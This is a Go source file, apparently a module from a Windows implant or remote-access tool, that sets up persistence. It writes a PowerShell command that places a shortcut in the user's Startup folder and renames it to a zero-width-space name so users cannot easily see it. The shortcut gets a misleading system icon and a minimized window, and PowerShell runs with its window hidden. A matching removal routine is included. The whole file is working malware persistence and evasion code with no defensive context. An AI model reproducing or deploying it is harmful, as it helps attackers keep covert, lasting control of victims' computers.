package persistence

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

const (
	createCmd = "$w=New-Object -C WScript.Shell;$u=$w.SpecialFolders('Startup')+'\\';$s=$w.CreateShortcut($u+'.lnk');$s.TargetPath='%s';$s.IconLocation='shell32.dll,50';$s.WindowStyle=7;$s.Save();Rename-Item $u'.lnk' ($u+[char]0x200b+'.lnk')"
	removeCmd = "$w=New-Object -C WScript.Shell;$u=$w.SpecialFolders('Startup')+'\\';Remove-Item ($u+[char]0x200b+'.lnk')"
)

// TryFolderInstall attempts to establish persistence by creating a startup shortcut.
func TryFolderInstall() error {
	cmd := fmt.Sprintf(createCmd, "powershell.exe")
	return runPowershell(cmd)
}

// UninstallFolder attempts to remove the startup shortcut.
func UninstallFolder() error {
	return runPowershell(removeCmd)
}
func runPowershell(command string) error {
	return runPowershellInternal(command, false)
}

func runPowershellInternal(command string, mScope bool) error {
	cmd := exec.Command("powershell", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if mScope {
		cmd.Dir = os.ExpandEnv("$temp")
	}
	out, err := cmd.CombinedOutput()

	if strings.Contains(string(out), "FullyQualifiedErrorId") {
		return errors.New("Command returned an error: " + string(out))
	}
	return err
}
